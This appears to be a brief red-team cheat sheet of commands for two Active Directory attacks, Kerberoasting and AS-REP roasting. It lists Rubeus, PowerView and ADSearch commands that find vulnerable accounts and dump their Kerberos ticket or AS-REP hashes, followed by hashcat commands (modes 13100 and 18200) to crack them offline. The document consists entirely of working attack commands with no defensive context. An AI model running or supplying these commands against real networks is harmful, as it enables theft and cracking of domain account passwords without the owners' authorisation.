Kerberoasting
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
```
or
```
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```

```
hashcat -a 0 -m 13100 hashes wordlist
```

AsrepRoasting
```
C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname


C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:username_of_adsearch /nowrap

hashcat -a 0 -m 18200 hash wordlist
```
